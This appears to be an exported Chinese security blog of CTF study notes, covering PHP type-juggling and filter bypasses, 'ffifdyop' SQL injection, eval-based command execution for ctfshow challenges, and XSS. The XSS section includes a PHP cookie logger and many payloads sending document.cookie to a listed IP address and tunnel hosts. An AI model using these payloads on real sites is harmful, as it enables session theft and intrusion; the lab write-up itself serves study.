invoke__">curl_close</span>(<span class="variable">$ch</span>); </span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$output</span>); </span><br><span class="line">    &#125; </span><br><span class="line">     </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]; </span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$url</span>))&#123; </span><br><span class="line">    <span class="title function_ invoke__">safe_request_url</span>(<span class="variable">$url</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>[buuctf 刷题记录 <a href="https://www.cnblogs.com/murkuo/p/14905886.html">第二章 web进阶]SSRF Training - MuRKuo - 博客园 (cnblogs.com)</a></p>
]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>php审计学习</title>
    <url>/2023/01/09/php%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p> 收集信息</p>
<p>php函数</p>
<p>正则匹配公式语法</p>
<p>绕过</p>
  <span id="more"></span>

<p>自动备份当前文件</p>
<p>index.php.swp</p>
<p>index.php.swo</p>
<p>index.php.bak</p>
<p>index.php.txt</p>
<p>index.php.old</p>
<p>index.php~</p>
<p>整站源码备份文件</p>
<p>www wwwdata  wwwroot  web  webrooot</p>
<p>backup dist</p>
<p>&#x2F;&#x2F;后面再加上.zip .tar.7z.rar</p>
<p>.tar.gz</p>
<p>或者御剑dirserach扫一下</p>
<h2 id="php函数"><a href="#php函数" class="headerlink" title="php函数"></a>php函数</h2><p><a href="https://www.php.net/">https://www.php.net/</a></p>
<p><strong>在PHP中，0&#x3D;&#x3D;&#x3D;FALSE是错误的</strong></p>
<h2 id="匹配公式语法"><a href="#匹配公式语法" class="headerlink" title="匹配公式语法"></a>匹配公式语法</h2><table>
<thead>
<tr>
<th align="center">量词</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">+</td>
<td>匹配任何至少包含一个前导字符串</td>
</tr>
<tr>
<td align="center">*</td>
<td>匹配任何包含零个或多个前导字符串</td>
</tr>
<tr>
<td align="center">?</td>
<td>匹配任何包含零个或1个前导字符串</td>
</tr>
<tr>
<td align="center">.</td>
<td>匹配任意一个字符串</td>
</tr>
<tr>
<td align="center">{x}</td>
<td>匹配任何包含x个前导字符串</td>
</tr>
<tr>
<td align="center">{x,y}</td>
<td>匹配任何包含 x 到 y 个前导字符串</td>
</tr>
<tr>
<td align="center">{x,}</td>
<td>匹配任何包含至少x个前导字符串</td>
</tr>
<tr>
<td align="center">^</td>
<td>匹配字符串的行首</td>
</tr>
<tr>
<td align="center">$</td>
<td>匹配字符串的行尾</td>
</tr>
<tr>
<td align="center">|</td>
<td>选择符 匹配字符串的左边或者右边</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th align="center">元字符</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">[a-z]</td>
<td>匹配任何包含小写字母a-z的字符串</td>
</tr>
<tr>
<td align="center">[A-Z]</td>
<td>匹配任何包含大写字母A-Z的字符串</td>
</tr>
<tr>
<td align="center">[0-9]</td>
<td>匹配任何包含0-9的字符串</td>
</tr>
<tr>
<td align="center">[abc]</td>
<td>匹配任何包含小写字母a,b,c的字符串</td>
</tr>
<tr>
<td align="center">[^abc]</td>
<td>匹配任何不包含小写字母a,b,c的字符串</td>
</tr>
<tr>
<td align="center">[a-zA-Z0-9_]</td>
<td>匹配任何包含a-zA-Z0-9和下划线的字符串</td>
</tr>
<tr>
<td align="center">\w</td>
<td>匹配任何包含a-zA-Z0-9和下划线的字符串</td>
</tr>
<tr>
<td align="center">\W</td>
<td>匹配任何不包含a-zA-Z0-9和下划线的字符串</td>
</tr>
<tr>
<td align="center">\d</td>
<td>匹配任何包含数字字符</td>
</tr>
<tr>
<td align="center">\D</td>
<td>匹配任何非数字字符</td>
</tr>
<tr>
<td align="center">\s</td>
<td>匹配任何空白字符</td>
</tr>
<tr>
<td align="center">\S</td>
<td>匹配任何非空白字符</td>
</tr>
<tr>
<td align="center">\b</td>
<td>匹配是否到达了单词边界</td>
</tr>
<tr>
<td align="center">\B</td>
<td>匹配没有到达了单词边界</td>
</tr>
<tr>
<td align="center">\</td>
<td>匹配正则中的特殊字符</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th align="center">修饰符</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">i</td>
<td>完全不区分大小写</td>
</tr>
<tr>
<td align="center">m</td>
<td>可以采用多行识别,遇到换行也承认匹配规则</td>
</tr>
<tr>
<td align="center">x</td>
<td>忽略掉规则模式中的空白字符</td>
</tr>
<tr>
<td align="center">A</td>
<td>强制从头开始匹配</td>
</tr>
<tr>
<td align="center">U</td>
<td>禁止贪婪匹配，只跟踪到最近的一个匹配符并结束</td>
</tr>
</tbody></table>
<p><a href="http://sai2.game178.cn/index.php/index/index/view/id/8">http://sai2.game178.cn/index.php/index/index/view/id/8</a></p>
<h2 id="intval"><a href="#intval" class="headerlink" title="intval"></a>intval</h2><p>直到遇上数字或正负符号才开始做转换，再遇到非数字或<a href="https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2&spm=1001.2101.3001.7020">字符串</a>结束时，结束转换</p>
<p>intval($id)会从字符串$id的起始位置开始去数字碰到非数字就结束,当起始位置为非数字时则为0。<br>比如<br>intval(‘100a123’)&#x3D;100<br>intval(‘a123’)&#x3D;0</p>
<p><code>?id=&#39;1000&#39; //&quot;1000&quot;或(1000)皆可 ?id=125&lt;&lt;3 //左移 ?id=680|320 //按位或 ?id=992^8 //按位异或 ?id=~~1000 //两次取反 ?id=0x3e8 //十六进制 ?id=0b1111101000 //二进制</code></p>
<p><code>?id=(1000)</code>以及+-*&#x2F;运算</p>
<h2 id="x3D-x3D-绕过"><a href="#x3D-x3D-绕过" class="headerlink" title="&#x3D;&#x3D;绕过"></a>&#x3D;&#x3D;绕过</h2><p>PHP比较运算符 &#x3D;&#x3D;在进行比较的时候是弱类型比较，只需要比较两个值相等就行，不会比较类型</p>
<p>PHP在处理哈希字符串时，会利用”!&#x3D;”或”&#x3D;&#x3D;”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br></pre></td></tr></table></figure>

<p>&#x3D;&#x3D;&#x3D;绕过<br>PHP比较运算符 &#x3D;&#x3D;&#x3D;在进行比较的时候，会先判断两种字符串的类型是否相等，再比较值是否相等。只要两边字符串类型不同会返回false</p>
<p>绕过方法：使用数组绕过</p>
<p>if($_GET[‘name’] !&#x3D; $_GET[‘password’]){</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">MD5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) == <span class="title function_ invoke__">MD5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;?&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>}</p>
<p>&#x2F;&#x2F;name[]&#x3D;1&amp;password[]&#x3D;2</p>
<p>PHP中md5()函数无法处理数组（会返回NULL）</p>
<p>md5值相等bp抓包传参</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</span><br><span class="line">&amp;b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</span><br></pre></td></tr></table></figure>

<p>&#x3D;&#x3D;的也可以用数组绕过</p>
<h2 id="is-numeric"><a href="#is-numeric" class="headerlink" title="is_numeric"></a>is_numeric</h2><p>16进制绕过</p>
<p>空字符%00 或者%20</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$password</span>)) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;password can&#x27;t be number&lt;/br&gt;&quot;</span>;</span><br><span class="line">	&#125;<span class="keyword">elseif</span> (<span class="variable">$password</span> == <span class="number">404</span>) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;Password Right!&lt;/br&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li><p>数值%20</p>
</li>
<li><p>%00数值</p>
</li>
<li><p>数值%00</p>
</li>
</ol>
<h2 id="ffifdyop"><a href="#ffifdyop" class="headerlink" title="ffifdyop"></a>ffifdyop</h2><p>经过md5加密后：276f722736c95d99e921722cf9ed621c</p>
<p>再转换为字符串：’or’6&lt;乱码&gt; 即  <code>&#39;or&#39;66 ]  !r,  b</code></p>
<p>用途：</p>
<p>select * from admin where password&#x3D;’’or’6&lt;乱码&gt;’</p>
<p>就相当于select * from admin where password&#x3D;’’or 1 实现sql注入</p>
<h2 id="ereg"><a href="#ereg" class="headerlink" title="ereg"></a>ereg</h2><p>**ereg()**函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的。</p>
<p>①%00截断及遇到%00则默认为字符串的结束</p>
<p>  ②当ntf为数组时它的返回值不是FALSE</p>
<p>web108</p>
<p>payload :  c&#x3D;a%00778  </p>
<h2 id="异常处理类"><a href="#异常处理类" class="headerlink" title="异常处理类"></a>异常处理类</h2><p>web109</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;</span><br><span class="line">    $v1 = $_GET[&#x27;v1&#x27;];</span><br><span class="line">    $v2 = $_GET[&#x27;v2&#x27;];</span><br><span class="line"></span><br><span class="line">    if(preg_match(&#x27;/[a-zA-Z]+/&#x27;, $v1) &amp;&amp; preg_match(&#x27;/[a-zA-Z]+/&#x27;, $v2))&#123;</span><br><span class="line">            eval(&quot;echo new $v1($v2());&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>体来说，该语句使用了 PHP 中的 “变量函数” 语法，其中 $v1 是一个变量，包含一个类名，$v2 是一个变量，包含参数值。该语句的执行将创建一个新的 $v1 类的实例，并将 $v2 的值作为参数传递给 $v1 类的构造函数。</p>
<p>例如，假设 $v1 包含类名 MyClass，$v2 包含参数值 “hello”，则执行该语句将创建一个新的 MyClass 对象实例，并调用 MyClass 的构造函数，如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phpCopy code</span><br><span class="line">$obj = new MyClass(&quot;hello&quot;);</span><br></pre></td></tr></table></figure>

<p>请注意，如果 $v1 中包含的类名不存在或无法访问，则会引发一个致命错误。同样，如果 $v1 类没有定义构造函数或构造函数需要不同数量或类型的参数，则也会引发一个错误。</p>
<p>Exception是一个内置类，用于表示程序运行时出现的异常情况。可以通过抛出（throw）异常来指示程序中的错误或问题，然后通过捕获（catch）异常来处理它们。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v1=Exception();system(&quot;ls&quot;);&amp;v2=a</span><br><span class="line">?v1=Exception();system(&quot;tac%09fl36dg.txt&quot;);&amp;v2=a</span><br><span class="line">?v1=ReflectionClass&amp;v2=system(&quot;ls&quot;)</span><br><span class="line">?v1=ReflectionClass(&quot;PDO&quot;);system(&quot;ls&quot;);&amp;v2=a</span><br></pre></td></tr></table></figure>

<p>从而实现命令执行</p>
<h2 id="FilesystemIterator类读取-文件"><a href="#FilesystemIterator类读取-文件" class="headerlink" title="FilesystemIterator类读取 文件"></a>FilesystemIterator类读取 文件</h2><p>web110</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>v1&#x3D;FilesystemIterator&amp;v2&#x3D;getcwd</p>
<p>通过新建FilesystemIterator，可以显示当前目录下的文件结构。由于参数内部有个括号，所以不能使用字符串来索引路径，而是要通过拼接方法getcwd()来获取当前的路径</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="title function_ invoke__">getcwd</span>().PHP_EOL;</span><br><span class="line">	<span class="keyword">echo</span> <span class="keyword">new</span> <span class="built_in">FilesystemIterator</span>(<span class="string">&#x27;./&#x27;</span>).PHP_EOL;</span><br><span class="line">	<span class="keyword">echo</span> <span class="keyword">new</span> <span class="built_in">FilesystemIterator</span>(<span class="title function_ invoke__">getcwd</span>());</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&gt;&gt;D:\PHP</span><br><span class="line">  index.php</span><br><span class="line">  index.php</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/Xxy605/article/details/110128544">(11条消息) CTF技巧_Web——PHP特性_使用文件系统迭代器FilesystemIterator和getcwd()查看当前目录下的文件结构_Ho1aAs的博客-CSDN博客</a></p>
<h2 id="GLOBALS全局变量"><a href="#GLOBALS全局变量" class="headerlink" title="$GLOBALS全局变量"></a>$GLOBALS全局变量</h2><p>从 PHP 8.1.0 起，不再支持对整个 $GLOBALS 数组的写访问：</p>
<p>$GLOBALS -引用全局作用域中可用的全部变量</p>
<p>一个包含了全部变量的全局组合数组。变量的名字就是数组的键。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function getFlag(&amp;$v1,&amp;$v2)&#123;</span><br><span class="line">    eval(&quot;$$v1 = &amp;$$v2;&quot;);</span><br><span class="line">    var_dump($$v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://www.php.net/manual/zh/reserved.variables.globals.php">PHP: $GLOBALS - Manual</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params">&amp;<span class="variable">$v1</span>,&amp;<span class="variable">$v2</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;$<span class="subst">$v1</span> = &amp;$<span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$$v1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">getFlag</span>(<span class="variable">$v1</span>,<span class="variable">$v2</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<p>?v2&#x3D;GLOBALS&amp;v1&#x3D;ctfshow</p>
<h2 id="phpfuzz"><a href="#phpfuzz" class="headerlink" title="phpfuzz"></a>phpfuzz</h2><p>web115</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">include(&#x27;flag.php&#x27;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">function filter($num)&#123;</span><br><span class="line">    $num=str_replace(&quot;0x&quot;,&quot;1&quot;,$num);</span><br><span class="line">    $num=str_replace(&quot;0&quot;,&quot;1&quot;,$num);</span><br><span class="line">    $num=str_replace(&quot;.&quot;,&quot;1&quot;,$num);</span><br><span class="line">    $num=str_replace(&quot;e&quot;,&quot;1&quot;,$num);</span><br><span class="line">    $num=str_replace(&quot;+&quot;,&quot;1&quot;,$num);</span><br><span class="line">    return $num;</span><br><span class="line">&#125;</span><br><span class="line">$num=$_GET[&#x27;num&#x27;];</span><br><span class="line">if(is_numeric($num) and $num!==&#x27;36&#x27; and trim($num)!==&#x27;36&#x27; and filter($num)==&#x27;36&#x27;)&#123;</span><br><span class="line">    if($num==&#x27;36&#x27;)&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &quot;hacker!!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;hacker!!!&quot;;</span><br><span class="line">&#125; hacker!!!</span><br></pre></td></tr></table></figure>

<p>fuzz脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">for($i = 0; $i&lt;129; $i++)&#123;</span><br><span class="line">	$num=chr($i).&#x27;36&#x27;;</span><br><span class="line">	if(trim($num)!==&#x27;36&#x27; &amp;&amp; is_numeric($num) &amp;&amp; $num!==&#x27;36&#x27;)&#123;</span><br><span class="line">		echo urlencode(chr($i)).&quot;\n&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="静态类调用"><a href="#静态类调用" class="headerlink" title="静态类调用"></a>静态类调用</h2><p>​         web137 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class ctfshow</span><br><span class="line">&#123;</span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        die(&quot;private class&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    static function getFlag()&#123;</span><br><span class="line">        echo file_get_contents(&quot;flag.php&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">call_user_func($_POST[&#x27;ctfshow&#x27;]);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>php中 -&gt;与:: 调用类中的成员的区别<br>-&gt;用于动态语境处理某个类的某个实例<br>::可以调用一个静态的、不依赖于其他初始化的类方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfshow=ctfshow::getFlag</span><br></pre></td></tr></table></figure>

<p><strong>在PHP中，0&#x3D;&#x3D;&#x3D;FALSE是错误的</strong> 不是强等于</p>
<p>stripos() 函数查找字符串在另一字符串中第一次出现的位置</p>
<p>preg_match不识别数组</p>
<p>stripos()函数对数组不识别，遇到数组会返回false</p>
<h2 id="绕过return的方式"><a href="#绕过return的方式" class="headerlink" title="绕过return的方式"></a>绕过return的方式</h2><p>php中有个有意思的地方，数字是可以和命令进行一些运算的，例如 <code>1-phpinfo();</code>结合减号是可以执行phpinfo()命令的。（不一定是减号，还有加、乘、除号，若用加号。要用<code>+</code>，要进行URL编码，这是个特殊字符，不进行编码会当作空格）</p>
]]></content>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshowxss</title>
    <url>/2023/02/26/xss/</url>
    <content><![CDATA[<p> xss</p>
<span id="more"></span>

<p>反射型XSS大多数是用来盗取用户的Cookie信息。</p>
<h1 id="web316-326（反射型）"><a href="#web316-326（反射型）" class="headerlink" title="web316-326（反射型）"></a>web316-326（反射型）</h1><p>在本地建一个网站代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line"><span class="variable">$log</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;cookie.txt&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$log</span>, <span class="variable">$cookie</span> . <span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$log</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;document.location.href=&#x27;http://101.43.182.125:7000/&#x27;+document.cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure>



<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&#x27;自己网站ip?cookie=&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>即可在自己网站生成一个cookie.txt文档即是flag</p>
<p>flag&#x3D;ctfshow{cbc17e98-ce5c-42a6-90f1-a2a5fb0bc724}</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;http://你的公网ip:端口号/&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="keyword">var</span> img = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;img&quot;</span>);img.<span class="property">src</span> = <span class="string">&quot;http://你的公网ip:端口号/?cookie=&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&#x27;http://你的公网ip:端口号/&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">location.<span class="property">href</span>=<span class="string">&#x27;http://你的公网ip:端口号/&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">&lt;input onfocus=&quot;window.open(&#x27;http://你的公网ip:端口号/&#x27;+document.cookie)&quot; autofocus&gt;</span><br><span class="line"></span><br><span class="line">&lt;svg onload=&quot;window.open(&#x27;http://你的公网ip:端口号/&#x27;+document.cookie)&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe onload=&quot;window.open(&#x27;http://你的公网ip:端口号/&#x27;+document.cookie)&quot;&gt;&lt;/iframe&gt;</span><br><span class="line"></span><br><span class="line">&lt;body onload=&quot;window.open(&#x27;http://你的公网ip:端口号/&#x27;+document.cookie)&quot;&gt;</span><br></pre></td></tr></table></figure>

<h3 id="web320-326"><a href="#web320-326" class="headerlink" title="web320-326"></a>web320-326</h3><p>过滤空格    &#x2F;**&#x2F;<br> payload语句</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;body/onload=<span class="string">&quot;window.location.href=&#x27;http://fe6e643.cpolar.top/2.php?c=&#x27;+document.cookie&quot;</span>&gt;</span><br></pre></td></tr></table></figure>

<h3 id="web328"><a href="#web328" class="headerlink" title="web328"></a>web328</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&#x27;https://16d59916.cpolar.cn/test.php?cookie=&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h2 id="web329"><a href="#web329" class="headerlink" title="web329"></a>web329</h2><p>每一次管理员的cookie会改变，所以无法使用上述的方式去获得cookie,,方法暂无</p>
<p>一、存储型XSS简介<br>（一）存储型XSS的概念<br>存储型XSS又称持久型XSS，攻击脚本将被永久地存放在目标服务器的数据库或文件中，具有很高的隐蔽性。反射型XSS的被攻击对象一般是攻击者去寻找的，就比如说：一个攻击者想盗取A的账号，那么攻击者就可以将一个含有反射型XSS的特制URL链接发送给A，然后用花言巧语诱骗A点击链接。当A不小心点进去时，就会立即受到XSS攻击。这种攻击方式需要一点骗术，所以这种攻击范围不是特别的广，并且提交漏洞时要么平台不认，要么会被认定为低危漏洞。<br>存储型XSS可以采用广撒网的方式，就是攻击者将存储型XSS代码写进一些有XSS漏洞的网站上，只要有用户访问这个链接就会自动中招。所以我们可以看出，存储型XSS的危害性更大，范围更广，可以不需要寻找被攻击对象，只要存储型XSS在服务器上就能实施攻击。所以提交的存储型XSS评级一般为中危漏洞。</p>
<p>（二）存储型XSS攻击过程<br>这种攻击多见于论坛、博客和留言板。攻击者在发帖的过程中，将恶意脚本连同正常信息一起注入帖子的内容中。随着帖子被服务器存储下来，恶意脚本也永久地被存放在服务器的后端数据库中。当其他用户浏览这个被注入了恶意脚本的帖子时，恶意脚本会在他们的浏览器中得到触发。<br>例如，攻击者在留言板中加入以下</p>
<script>alert(1)</script>
<p>这样当其他用户访问留言板时，就会看到一个弹窗。可以看到，存储型XSS的攻击方式能够将恶意代码永久地存入数据库或者文件中，相当于将代码嵌入一个页面中，所有访问这个页面的用户都将成为受害者。如果我们能够谨慎对待不明链接，那么反射型XSS攻击将没有多大作为，而存储型XSS则不同，由于它注入在一些我们非常信任的页面中，因此无论我们多么小心，都难免会受到攻击。</p>
